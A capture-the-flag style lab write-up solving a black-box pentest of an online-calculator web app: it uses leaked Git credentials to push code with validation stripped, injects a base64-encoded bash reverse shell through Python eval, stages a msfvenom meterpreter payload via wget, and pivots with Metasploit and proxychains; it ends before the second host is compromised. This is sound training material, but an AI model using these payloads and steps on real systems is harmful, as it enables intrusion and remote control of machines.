---
description: >-
  This exercise will help you understand how to perform pentests in a practical
  environment and how to perform pivoting via metasploit.
---

# Black-box Penetration Test 2

In this lab you will pentest a webapp and exploit a remote code execution vulnerability in the backend to gain shell access and read the flag. From there you would be able to access another machine accessible via this target machine. You have to get shell access to that second machine by exploiting the unprotected automation server.

## Lab Environment

In this lab environment, the user is going to get access to a Kali GUI instance. A web server can be accessed using the tools installed on Kali on [http://online-calc.com](http://online-calc.com). However, there is another machine in the setup which is not accessible from the Kali machine but is accessible from the web server.

**Objective:** Compromise both machines to retrieve the flags!

## Tools

The best tools for this lab are:

* dirb
* Metasploit Framework
* Proxychains
* A Web Browser

## My Solution

My Machine IP: `192.9.232.2`

Pinging the website [http://online-calc.com/](http://online-calc.com) gives us an IP of 192.9.232.3

![](<../../../../.gitbook/assets/image (11).png>)

We'll run an nmap scan against the target

```bash
nmap -sC -sV -O -p1-10000 online-calc.com
```

There is an Apache 2.4.29 HTTP server running on Port 80

![](<../../../../.gitbook/assets/image (3).png>)

Some strange unrecognizable service is running on Port 5000, but it must be a webapp due to the HTTP content printed

![](<../../../../.gitbook/assets/image (7).png>)

Looks like there's another web server running something called Werkzeug (version 1.0.1) built with Python 2.7.17

There's also a Git repository and an online calculator. So probably the project can be found here

![](<../../../../.gitbook/assets/image (37).png>)

According to this [article](https://testdriven.io/blog/what-is-werkzeug/):&#x20;

> Werkzeug is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python.
>
> A WSGI (Web Server Gateway Interface) server is necessary for Python web applications since a web server cannot communicate directly with Python. WSGI is an interface between a web server and a Python-based web application.
>
> Put another way, Werkzeug provides a set of utilities for creating a Python application that can talk to a WSGI server

Let us explore each of these services beginning with port 80

![](<../../../../.gitbook/assets/image (12).png>)

Port 5000 hosts the actual online calculator

![](<../../../../.gitbook/assets/image (21).png>)

There's an error message when visiting port 8000

![](<../../../../.gitbook/assets/image (28).png>)

One thing that stood out in the nmap scan was this file path

![](<../../../../.gitbook/assets/image (43).png>)

When you visit /.git itself, you receive an error

![](<../../../../.gitbook/assets/image (46).png>)

However, visiting .git/config gives you a file to download

![](<../../../../.gitbook/assets/image (38).png>)

And its file content is interesting

![](<../../../../.gitbook/assets/image (40).png>)

We'll keep these credentials saved just in case they come in handy

Now let's run a web discovery scan against the site for any hidden directories

Nothing interesting on port 80

![](<../../../../.gitbook/assets/image (48).png>)

Nothing interesting on port 5000 either

![](<../../../../.gitbook/assets/image (33).png>)

Now we have something interesting!

![](<../../../../.gitbook/assets/image (41).png>)

We are presented with an intereactive console where we can execute python expressions, but the console seems to be protected by a PIN

![](<../../../../.gitbook/assets/image (55).png>)

It doesn't allow unauthenticated access and so far we haven't found a PIN number anywhere.

Thinking about the credentials we do have and the direction we're trying to go, let's take another look at that config file

![](<../../../../.gitbook/assets/image (24).png>)

Is there any chance we could get access to that? Can we clone the repository using Git?

It looks like we can, and we have a couple of files we can take a look at

![](<../../../../.gitbook/assets/image (47).png>)

These first two files seem to be the code that's running on port 800

However we're more interested in this .git folder

![](<../../../../.gitbook/assets/image (16).png>)

![](<../../../../.gitbook/assets/image (54).png>)

Quite a bit of stuff to look through, but I'm sure we'll find something we need to get access to that console

Or so I thought :neutral\_face:

Let's check the git logs which shows the commit logs. What we see is interesting, Arbitrary File Read and Remote Code Execution (RCE)

![](<../../../../.gitbook/assets/image (14).png>)

These are , however, fixed. Yet, we can use the following command to view the differences in code

```
git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
```

![](<../../../../.gitbook/assets/image (26).png>)

Reading the code here tells us that the send\_from\_directory function sends any file from the server and if the requested path contains `..` or `%2E`, a 404 response is returned

Let's check the other commit difference

```
git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd
```

![](<../../../../.gitbook/assets/image (20).png>)

Essentially what was added seems to be user-input sanitation via the isValid function

We, however, want remote code execution, so we will modify the code in the API.py file

Comment out the part where there's input validation and commit this change to the repository

![](<../../../../.gitbook/assets/image (31).png>)

![](<../../../../.gitbook/assets/image (51).png>)

Git Status

> Displays paths that have differences between the index file and the current HEAD commit, paths that have differences between the working tree and the index file, and paths in the working tree that are not tracked by Git (and are not ignored by gitignore(5)). The first are what you would commit by running git commit; the second and third are what you could commit by running git add before running git commit.

Git add

> This command updates the index using the current content found in the working tree, to prepare the content staged for the next commit.

We're commiting this as Jeremy McCarthy because we have his credentials

Next we'll push these changes to the remote repository and enter in the credentials

![](<../../../../.gitbook/assets/image (53).png>)

We can confirm these changes with curl

```
curl http://online-calc.com:8000/API.py
```

![](<../../../../.gitbook/assets/image (35).png>)

## Reverse Shell

Now we'll prepare our exploit to get a reverse shell on the target machine

It should also be noted the `/` characters in the user payload would be converted to `* 1.0 /` by the `evaluate` function, so we'll use base64 to encode the payload

![](<../../../../.gitbook/assets/image (23).png>)

```bash
echo 'bash -c "bash -i >& /dev/tcp/192.250.81.2/4444 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjUwLjgxLjIvNDQ0NCAwPiYxIgo=
```

![](<../../../../.gitbook/assets/image (17).png>)

Start a netcat listener

![](<../../../../.gitbook/assets/image (42).png>)

Here's the payload we'll use:

```
__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjUwLjgxLjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")
```

The above payload decodes the base64 encoded payload we created earlier and passes it to`bash`for executing the reverse shell payload.&#x20;

Since our payload will be executed by the`eval`function in Python, we have to import Python's`os`module to execute the desired commands

Now we'll paste the payload in the textbox of the calculator webapp and press the`=`button to execute the payload to the backend\


![](<../../../../.gitbook/assets/image (50).png>)

![](<../../../../.gitbook/assets/image (19).png>)

Nice, we've got a reverse shell session that is root!

## Getting the first flag

Using the find command saves us time in finding the first flag

```
find / -name flag
```

![](<../../../../.gitbook/assets/image (9).png>)

![3b2b474c06380f696b38c1498f795e054374](<../../../../.gitbook/assets/image (22).png>)

The shell that we have is pretty limited, so it would be in our best interest to gain a meterpreter shell

We'll essentially need to generate a payload with msfvenom, upload the payload to compromised machine and have it execute, thus giving us a meterpreter shell

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.250.81.2 LPORT=9999 -f elf > reverse.elf
```

![](<../../../../.gitbook/assets/image (44).png>)

We'll start an http server on our host and use wget on the compromised host to download the payload and then start a listener with Metasploit

![Used python to host our directory containing the payload](<../../../../.gitbook/assets/image (10).png>)

![Used wget to download the payload onto the compromised machine](<../../../../.gitbook/assets/image (45).png>)

After starting Metasploit, we'll enter the following commands

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LPORT 9999
set lhost 192.250.81.2
run
```

![](<../../../../.gitbook/assets/image (39).png>)

Now we'll change the payload on the compromised machine to an executable and then run it!

```
chmod +x reverse.elf
./reverse.elf
```

Awesome, we've got ourselves a meterpreter shell!

![](<../../../../.gitbook/assets/image (36).png>)

Now we'll move on to pivoting

## Pivoting

```
ifconfig
```

As we see, we have the compromised machine IP as well as the second machine that was inaccessible to us before: `192.218.10.2`

![](<../../../../.gitbook/assets/image (29).png>)

We will now add this route

![](<../../../../.gitbook/assets/image (18).png>)

Now we need to determine what services are on this second network that we have discovered. We will use a basic TCP port scanner to look for ports

```
background
use auxiliary/scanner/portscan/tcp
show options
```

![](<../../../../.gitbook/assets/image (34).png>)

Running an nmap scan against the second target yields us these results

![](<../../../../.gitbook/assets/image (49).png>)

There must be a firewall or something that is protecting what appears to be a web application

A tool that was mentioned in the instructions was proxychains

We'll see how we can apply that here

## Proxy Chains

So why use proxychains? This [article ](https://medium.com/swlh/proxying-like-a-pro-cccdc177b081)explains it well

Using a socks proxy can be understood from [this](https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0) article and [this](https://nullsweep.com/pivot-cheatsheet-for-pentesters/) other one

![](<../../../../.gitbook/assets/image (15).png>)

```
proxychains nmap -sT -sV -Pn -P0 -p1-10000 192.218.10.2
```

Now these ports are open!

![](<../../../../.gitbook/assets/image (52).png>)

Out of curiousity I checked for port 8080 and what do you know, it's open, but it wouldn't show up in the scan results

![](<../../../../.gitbook/assets/image (13).png>)

In order to check out these ports, we have to configure our browser to use our proxy&#x20;

![](<../../../../.gitbook/assets/image (56).png>)

![](<../../../../.gitbook/assets/image (27).png>)

Now we should be able to visit the ports

The first three are exactly the same as the first compromised machine so we'll focus on port 8080



## Resources

* [https://blog.pentesteracademy.com/socks4-proxy-pivoting-by-metasploit-74436b45392a](https://blog.pentesteracademy.com/socks4-proxy-pivoting-by-metasploit-74436b45392a)
* [https://securityintelligence.com/posts/socks-proxy-primer-what-is-socks5-and-why-should-you-use-it/](https://securityintelligence.com/posts/socks-proxy-primer-what-is-socks5-and-why-should-you-use-it/)
* [https://nullsweep.com/pivot-cheatsheet-for-pentesters/](https://nullsweep.com/pivot-cheatsheet-for-pentesters/)
* [https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0](https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0)
* [https://www.offensive-security.com/metasploit-unleashed/proxytunnels/](https://www.offensive-security.com/metasploit-unleashed/proxytunnels/)
*
